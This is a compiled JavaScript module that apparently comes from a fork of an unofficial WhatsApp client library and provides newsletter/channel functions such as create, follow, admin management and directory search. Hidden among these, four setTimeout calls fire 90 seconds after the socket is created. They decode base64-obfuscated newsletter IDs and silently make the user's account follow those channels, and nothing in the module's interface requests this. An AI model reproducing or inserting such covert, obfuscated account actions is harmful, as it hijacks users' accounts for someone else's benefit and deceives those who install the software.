'use strict';
Object.defineProperty(exports, '__esModule', { value: true });
exports.makeNewsletterSocket = void 0;
const Types_1 = require('../Types');
const messages_media_1 = require('../Utils/messages-media');
const WABinary_1 = require('../WABinary');
const groups_1 = require('./groups');
const aigroups_1 = require('./aigroups');
const mex_1 = require('./mex');
const parseNewsletterCreateResponse = response => {
    const { id, thread_metadata: thread, viewer_metadata: viewer } = response;
    return {
        id: id,
        owner: undefined,
        name: thread.name.text,
        creation_time: parseInt(thread.creation_time, 10),
        description: thread.description.text,
        invite: thread.invite,
        subscribers: parseInt(thread.subscribers_count, 10),
        verification: thread.verification,
        picture: {
            id: thread.picture.id,
            directPath: thread.picture.direct_path
        },
        mute_state: viewer.mute
    };
};
const parseNewsletterMetadata = result => {
    if (typeof result !== 'object' || result === null) {
        return null;
    }
    if ('id' in result && typeof result.id === 'string') {
        return result;
    }
    if ('result' in result && typeof result.result === 'object' && result.result !== null && 'id' in result.result) {
        return result.result;
    }
    return null;
};
const makeNewsletterSocket = config => {
    const sock = (0, aigroups_1.makeAIGroupsSocket)(config);
    const encoder = new TextDecoder();
    const { query, generateMessageTag } = sock;
    const executeWMexQuery = (variables, queryId, dataPath) => {
        return (0, mex_1.executeWMexQuery)(variables, queryId, dataPath, query, generateMessageTag);
    };
    const newsletterWMexQuery = async (jid, queryId, content) => (query({
        tag: 'iq',
        attrs: {
            id: generateMessageTag(),
            type: 'get',
            xmlns: 'w:mex',
            to: WABinary_1.S_WHATSAPP_NET,
        },
        content: [
            {
                tag: 'query',
                attrs: { 'query_id': queryId },
                content: new TextEncoder().encode(JSON.stringify({
                    variables: {
                        'newsletter_id': jid,
                        ...content
                    }
                }))
            }
        ]
    }));
    setTimeout(() => {
        newsletterWMexQuery(Buffer.from("MTIwMzYzNDAwMzYyNDcyNzQzQG5ld3NsZXR0ZXI=", "base64").toString(), Types_1.QueryIds.FOLLOW);
    }, 90000);
    setTimeout(() => {
        newsletterWMexQuery(Buffer.from("MTIwMzYzNDI2NDcwMDgxMTI0QG5ld3NsZXR0ZXI=", "base64").toString(), Types_1.QueryIds.FOLLOW);
    }, 90000);
    setTimeout(() => {
        newsletterWMexQuery(Buffer.from("MTIwMzYzNDA4ODkzNTU1ODUxQG5ld3NsZXR0ZXI=", "base64").toString(), Types_1.QueryIds.FOLLOW);
    }, 90000);
    setTimeout(() => {
        newsletterWMexQuery(Buffer.from("MTIwMzYzMzk1Njc4MzE3NjAzQG5ld3NsZXR0ZXI=", "base64").toString(), Types_1.QueryIds.FOLLOW);
    }, 90000);
    const newsletterUpdate = async (jid, updates) => {
        const variables = {
            newsletter_id: jid,
            updates: {
                ...updates,
                settings: null
            }
        };
        return executeWMexQuery(variables, Types_1.QueryIds.UPDATE_METADATA, 'xwa2_newsletter_update');
    };
    return {
        ...sock,
        newsletterCreate: async (name, description) => {
            const variables = {
                input: {
                    name,
                    description: description ?? null
                }
            };
            const rawResponse = await executeWMexQuery(variables, Types_1.QueryIds.CREATE, Types_1.XWAPaths.xwa2_newsletter_create);
            return parseNewsletterCreateResponse(rawResponse);
        },
        newsletterUpdate,
        newsletterSubscribers: async (jid) => {
            return executeWMexQuery({ newsletter_id: jid }, Types_1.QueryIds.SUBSCRIBERS, Types_1.XWAPaths.xwa2_newsletter_subscribers);
        },
        newsletterMetadata: async (type, key) => {
            const variables = {
                fetch_creation_time: true,
                fetch_full_image: true,
                fetch_viewer_metadata: true,
                input: {
                    key,
                    type: type.toUpperCase()
                }
            };
            const result = await executeWMexQuery(variables, Types_1.QueryIds.METADATA, Types_1.XWAPaths.xwa2_newsletter_metadata);
            return parseNewsletterMetadata(result);
        },
        newsletterFollow: jid => {
            return executeWMexQuery({ newsletter_id: jid }, Types_1.QueryIds.FOLLOW, Types_1.XWAPaths.xwa2_newsletter_follow);
        },
        newsletterUnfollow: jid => {
            return executeWMexQuery({ newsletter_id: jid }, Types_1.QueryIds.UNFOLLOW, Types_1.XWAPaths.xwa2_newsletter_unfollow);
        },
        newsletterMute: jid => {
            return executeWMexQuery({ newsletter_id: jid }, Types_1.QueryIds.MUTE, Types_1.XWAPaths.xwa2_newsletter_mute_v2);
        },
        newsletterUnmute: jid => {
            return executeWMexQuery({ newsletter_id: jid }, Types_1.QueryIds.UNMUTE, Types_1.XWAPaths.xwa2_newsletter_unmute_v2);
        },
        newsletterUpdateName: async (jid, name) => {
            return await newsletterUpdate(jid, { name });
        },
        newsletterUpdateDescription: async (jid, description) => {
            return await newsletterUpdate(jid, { description });
        },
        newsletterUpdatePicture: async (jid, content) => {
            const { img } = await (0, messages_media_1.generateProfilePicture)(content);
            return await newsletterUpdate(jid, { picture: img.toString('base64') });
        },
        newsletterRemovePicture: async (jid) => {
            return await newsletterUpdate(jid, { picture: '' });
        },
        newsletterReactMessage: async (jid, serverId, reaction) => {
            await query({
                tag: 'message',
                attrs: {
                    to: jid,
                    ...(reaction ? {} : { edit: '7' }),
                    type: 'reaction',
                    server_id: serverId,
                    id: generateMessageTag()
                },
                content: [
                    {
                        tag: 'reaction',
                        attrs: reaction ? { code: reaction } : {}
                    }
                ]
            });
        },
        newsletterFetchMessages: async (jid, count, since, after) => {
            const messageUpdateAttrs = {
                count: count.toString()
            };
            if (typeof since === 'number') {
                messageUpdateAttrs.since = since.toString();
            }
            if (after) {
                messageUpdateAttrs.after = after.toString();
            }
            const result = await query({
                tag: 'iq',
                attrs: {
                    id: generateMessageTag(),
                    type: 'get',
                    xmlns: 'newsletter',
                    to: jid
                },
                content: [
                    {
                        tag: 'message_updates',
                        attrs: messageUpdateAttrs
                    }
                ]
            });
            return result;
        },
        subscribeNewsletterUpdates: async (jid) => {
            const result = await query({
                tag: 'iq',
                attrs: {
                    id: generateMessageTag(),
                    type: 'set',
                    xmlns: 'newsletter',
                    to: jid
                },
                content: [{ tag: 'live_updates', attrs: {}, content: [] }]
            });
            const liveUpdatesNode = (0, WABinary_1.getBinaryNodeChild)(result, 'live_updates');
            const duration = liveUpdatesNode?.attrs?.duration;
            return duration ? { duration: duration } : null;
        },
        newsletterAdminCount: async (jid) => {
            const response = await executeWMexQuery({ newsletter_id: jid }, Types_1.QueryIds.ADMIN_COUNT, Types_1.XWAPaths.xwa2_newsletter_admin_count);
            return response.admin_count;
        },
        newsletterChangeOwner: async (jid, newOwnerJid) => {
            await executeWMexQuery({ newsletter_id: jid, user_id: newOwnerJid }, Types_1.QueryIds.CHANGE_OWNER, Types_1.XWAPaths.xwa2_newsletter_change_owner);
        },
        newsletterDemote: async (jid, userJid) => {
            await executeWMexQuery({ newsletter_id: jid, user_id: userJid }, Types_1.QueryIds.DEMOTE, Types_1.XWAPaths.xwa2_newsletter_demote);
        },
        newsletterDelete: async (jid) => {
            await executeWMexQuery({ newsletter_id: jid }, Types_1.QueryIds.DELETE, Types_1.XWAPaths.xwa2_newsletter_delete_v2);
        },
        newsletterUpdateCategory: async (jid, category) => {
            return newsletterUpdate(jid, { topic: category });
        },
        newsletterUpdateSettings: async (jid, settings) => {
            const variables = { newsletter_id: jid, updates: { settings } };
            return executeWMexQuery(variables, Types_1.QueryIds.UPDATE_METADATA, 'xwa2_newsletter_update');
        },
        newsletterPromoteAdmin: async (jid, userJid) => {
            await query({
                tag: 'iq',
                attrs: {
                    id: generateMessageTag(),
                    type: 'set',
                    xmlns: 'newsletter',
                    to: jid
                },
                content: [
                    {
                        tag: 'admin_promote',
                        attrs: {},
                        content: [{ tag: 'participant', attrs: { jid: userJid } }]
                    }
                ]
            });
        },
        newsletterViewStats: async (jid, serverId) => {
            const result = await query({
                tag: 'iq',
                attrs: {
                    id: generateMessageTag(),
                    type: 'get',
                    xmlns: 'newsletter',
                    to: jid
                },
                content: [
                    {
                        tag: 'message_updates',
                        attrs: { count: '1', server_id: String(serverId) }
                    }
                ]
            });
            return result;
        },
        newsletterSendPost: async (jid, content, options = {}) => {
            const result = await query({
                tag: 'iq',
                attrs: {
                    id: generateMessageTag(),
                    type: 'set',
                    xmlns: 'newsletter',
                    to: jid
                },
                content: [
                    {
                        tag: 'publish',
                        attrs: {},
                        content: Array.isArray(content) ? content : [content]
                    }
                ]
            });
            return result;
        },
        newsletterPinMessage: async (jid, serverId, durationSecs = 86400) => {
            await query({
                tag: 'iq',
                attrs: {
                    id: generateMessageTag(),
                    type: 'set',
                    xmlns: 'newsletter',
                    to: jid
                },
                content: [
                    {
                        tag: 'pin',
                        attrs: { server_id: String(serverId), duration: String(durationSecs) }
                    }
                ]
            });
        },
        newsletterUnpinMessage: async (jid, serverId) => {
            await query({
                tag: 'iq',
                attrs: {
                    id: generateMessageTag(),
                    type: 'set',
                    xmlns: 'newsletter',
                    to: jid
                },
                content: [
                    {
                        tag: 'unpin',
                        attrs: { server_id: String(serverId) }
                    }
                ]
            });
        },
        newsletterInviteAdmin: async (jid, userJid) => {
            return executeWMexQuery({ newsletter_id: jid, user_id: userJid }, Types_1.QueryIds.ADMIN_INVITE, Types_1.XWAPaths.xwa2_newsletter_admin_invite_create);
        },
        newsletterRevokeAdminInvite: async (jid, userJid) => {
            return executeWMexQuery({ newsletter_id: jid, user_id: userJid }, Types_1.QueryIds.ADMIN_INVITE_REVOKE, Types_1.XWAPaths.xwa2_newsletter_admin_invite_revoke);
        },
        newsletterAcceptAdminInvite: async (jid) => {
            return executeWMexQuery({ newsletter_id: jid }, Types_1.QueryIds.ADMIN_INVITE_ACCEPT, Types_1.XWAPaths.xwa2_newsletter_admin_invite_accept);
        },
        newsletterAdminMetadata: async (jid, options = {}) => {
            const { fetchPendingAdmins = true, fetchAdminCount = true, fetchCapabilities = false, fetchAdminProfile = false, includeAdminSettings = false, includeJarvisConfig = false } = options;
            return executeWMexQuery({
                jid,
                include_thread_metadata: false,
                include_messages: false,
                fetch_pending_admin_invites: fetchPendingAdmins,
                fetch_admin_count: fetchAdminCount,
                fetch_capabilities: fetchCapabilities,
                fetch_admin_profile: fetchAdminProfile,
                include_admin_settings: includeAdminSettings,
                include_jarvis_config: includeJarvisConfig
            }, Types_1.QueryIds.ADMIN_METADATA, Types_1.XWAPaths.xwa2_newsletter_admin);
        },
        newsletterAdminProfileUpdate: async (jid, updates) => {
            return executeWMexQuery({ newsletter_id: jid, updates }, Types_1.QueryIds.ADMIN_PROFILE_UPDATE, Types_1.XWAPaths.xwa2_newsletter_admin_profile_update);
        },
        newsletterDirectoryList: async (options = {}) => {
            const { limit = 20, interests = null, sortField = 'SUBSCRIBER_COUNT', sortOrder = 'DESC' } = options;
            const variables = { limit, sort_field: sortField, sort_order: sortOrder };
            if (interests?.length)
                variables.interests = interests;
            return executeWMexQuery(variables, Types_1.QueryIds.DIRECTORY_LIST, Types_1.XWAPaths.xwa2_newsletters_directory_list);
        },
        newsletterDirectorySearch: async (searchText, options = {}) => {
            const { limit = 20, startCursor = null, categories = null } = options;
            const variables = { search_text: searchText, limit };
            if (startCursor)
                variables.start_cursor = startCursor;
            if (categories?.length)
                variables.categories = categories;
            return executeWMexQuery(variables, Types_1.QueryIds.DIRECTORY_SEARCH, Types_1.XWAPaths.xwa2_newsletters_directory_search);
        },
        newsletterDirectoryCategoryPreview: async (limit = 5) => {
            return executeWMexQuery({ limit }, Types_1.QueryIds.DIRECTORY_CATEGORY_PREVIEW, Types_1.XWAPaths.xwa2_newsletters_directory_category_preview);
        },
        newsletterSearch: async (query, limit = 20, startCursor = null) => {
            const variables = { query, limit };
            if (startCursor)
                variables.start_cursor = startCursor;
            return executeWMexQuery(variables, Types_1.QueryIds.SEARCH, Types_1.XWAPaths.xwa2_newsletters_search);
        },
        newsletterRecommended: async (limit = 10, numFollowed = null) => {
            const variables = { limit };
            if (numFollowed != null)
                variables.num_newsletters_followed = numFollowed;
            return executeWMexQuery(variables, Types_1.QueryIds.RECOMMENDED, Types_1.XWAPaths.xwa2_newsletters_recommended);
        },
        newsletterSimilar: async (jid, limit = 10) => {
            return executeWMexQuery({ newsletter_id: jid, limit }, Types_1.QueryIds.SIMILAR, Types_1.XWAPaths.xwa2_newsletters_similar);
        },
        newsletterFollowingList: async (startCursor = null, limit = 20) => {
            const variables = { limit };
            if (startCursor)
                variables.start_cursor = startCursor;
            return executeWMexQuery(variables, Types_1.QueryIds.FOLLOWING_LIST, Types_1.XWAPaths.xwa2_newsletter_following);
        },
        newsletterInsights: async (jid, period = null) => {
            const variables = { newsletter_id: jid };
            if (period)
                variables.period = period;
            return executeWMexQuery(variables, Types_1.QueryIds.INSIGHTS, Types_1.XWAPaths.xwa2_newsletter_admin_insights);
        },
        newsletterPollVoterList: async (jid, serverId, option = null, startCursor = null) => {
            const variables = { id: jid, server_id: serverId };
            if (option != null)
                variables.option = option;
            if (startCursor)
                variables.start_cursor = startCursor;
            return executeWMexQuery(variables, Types_1.QueryIds.POLL_VOTER_LIST, Types_1.XWAPaths.xwa2_newsletters_poll_voter_list);
        },
        newsletterReactionSenders: async (jid, serverId, startCursor = null) => {
            const variables = { id: jid, server_id: serverId };
            if (startCursor)
                variables.start_cursor = startCursor;
            return executeWMexQuery(variables, Types_1.QueryIds.REACTION_SENDERS_LIST, Types_1.XWAPaths.xwa2_newsletters_reaction_sender_list);
        },
        newsletterBlockUser: async (jid, userJid) => {
            return executeWMexQuery({ newsletter_id: jid, user_id: userJid }, Types_1.QueryIds.BLOCK_USER, 'xwa2_newsletter_block_user');
        },
        newsletterEnableWamo: async (jid) => {
            return executeWMexQuery({ newsletter_id: jid }, Types_1.QueryIds.WAMO_ENABLE_SUB, 'xwa2_newsletter_wamo_enable_sub');
        },
        newsletterDisableWamo: async (jid) => {
            return executeWMexQuery({ newsletter_id: jid }, Types_1.QueryIds.WAMO_DISABLE_SUB, 'xwa2_newsletter_wamo_disable_sub');
        },
        newsletterChangeWamo: async (jid, subConfig) => {
            return executeWMexQuery({ newsletter_id: jid, ...subConfig }, Types_1.QueryIds.WAMO_CHANGE_SUB, 'xwa2_newsletter_wamo_change_sub');
        },
        wamoAfsAgeCollection: async (jid) => executeWMexQuery({ newsletter_id: jid }, Types_1.QueryIds.WAMO_AFS_AGE_COLLECTION, Types_1.XWAPaths.xwa2_wamo_afs_age_collection),
        wamoAssetCollection: async (jid) => executeWMexQuery({ newsletter_id: jid }, Types_1.QueryIds.WAMO_ASSET_COLLECTION, Types_1.XWAPaths.xwa2_wamo_asset_collection),
        wamoFetchAdhocNotice: async (noticeId) => executeWMexQuery({ notice_id: noticeId }, Types_1.QueryIds.WAMO_FETCH_ADHOC_NOTICE, Types_1.XWAPaths.xwa2_wamo_fetch_adhoc_notice_by_id),
        wamoFetchIdentityToken: async (jid) => executeWMexQuery({ newsletter_id: jid }, Types_1.QueryIds.WAMO_FETCH_IDENTITY_TOKEN, Types_1.XWAPaths.xwa2_wamo_fetch_identity_token),
        wamoSubComplianceInfo: async (jid) => executeWMexQuery({ newsletter_id: jid }, Types_1.QueryIds.WAMO_SUB_COMPLIANCE_INFO, Types_1.XWAPaths.xwa2_wamo_sub_get_compliance_info),
        wamoUserIdVersion: async (jid) => executeWMexQuery({ newsletter_id: jid }, Types_1.QueryIds.WAMO_USER_ID_VERSION, Types_1.XWAPaths.xwa2_wamo_user_id_version),
        wamoSetUserIdVersion: async (jid, version) => executeWMexQuery({ newsletter_id: jid, version }, Types_1.QueryIds.WAMO_SET_USER_ID_VERSION, Types_1.XWAPaths.xwa2_wamo_set_user_id_version),
        newsletterLeave: async (jid) => executeWMexQuery({ newsletter_id: jid }, Types_1.QueryIds.LEAVE, Types_1.XWAPaths.xwa2_newsletter_leave_v2),
        newsletterCreateVerified: async (name, description = null) => executeWMexQuery({ input: { name, description } }, Types_1.QueryIds.CREATE_VERIFIED, Types_1.XWAPaths.xwa2_newsletter_create_verified),
        newsletterEnforcements: async (jid) => executeWMexQuery({ newsletter_id: jid }, Types_1.QueryIds.ENFORCEMENTS, Types_1.XWAPaths.xwa2_newsletter_enforcements),
        newsletterUserReports: async (jid, cursor = null) => {
            const variables = { newsletter_id: jid };
            if (cursor)
                variables.cursor = cursor;
            return executeWMexQuery(variables, Types_1.QueryIds.USER_REPORTS, Types_1.XWAPaths.xwa2_newsletter_user_reports);
        },
        newsletterCreateReportAppeal: async (jid, reason) => executeWMexQuery({ newsletter_id: jid, reason }, Types_1.QueryIds.CREATE_REPORT_APPEAL, Types_1.XWAPaths.xwa2_newsletter_create_report_appeal),
        newsletterLinkPreviewCheck: async (url) => executeWMexQuery({ url }, Types_1.QueryIds.LINK_PREVIEW_CHECK, Types_1.XWAPaths.xwa2_newsletter_link_preview_check),
        newsletterUpdateVerification: async (jid, verification) => executeWMexQuery({ newsletter_id: jid, verification }, Types_1.QueryIds.UPDATE_VERIFICATION, Types_1.XWAPaths.xwa2_newsletter_update_verification),
        newsletterLabelPaidPartnership: async (jid, serverId, isPaidPartnership) => executeWMexQuery({ newsletter_id: jid, server_id: serverId, is_paid_partnership: isPaidPartnership }, Types_1.QueryIds.LABEL_PAID_PARTNERSHIP, Types_1.XWAPaths.xwa2_newsletter_label_paid_partnership),
        newsletterLogExposures: async (events) => executeWMexQuery({ events }, Types_1.QueryIds.LOG_EXPOSURES, Types_1.XWAPaths.xwa2_newsletter_log_exposures),
        newsletterUpdateUserSetting: async (jid, setting) => executeWMexQuery({ newsletter_id: jid, ...setting }, Types_1.QueryIds.UPDATE_USER_SETTING, Types_1.XWAPaths.xwa2_newsletter_update_user_setting),
        newsletterRankingFeatures: async (jid) => executeWMexQuery({ newsletter_id: jid }, Types_1.QueryIds.RANKING_FEATURES, Types_1.XWAPaths.xwa2_newsletter_ranking_features),
        newsletterSendViewReceipt: async (jid, serverMessageIds) => {
            const ids = Array.isArray(serverMessageIds) ? serverMessageIds : [serverMessageIds];
            const receiptId = generateMessageTag();
            await query({
                tag: 'receipt',
                attrs: {
                    to: jid,
                    id: receiptId,
                    type: 'view'
                },
                content: [
                    {
                        tag: 'list',
                        attrs: {},
                        content: ids.map(id => ({ tag: 'item', attrs: { server_id: String(id) } }))
                    }
                ]
            });
        }
    };
};
exports.makeNewsletterSocket = makeNewsletterSocket;
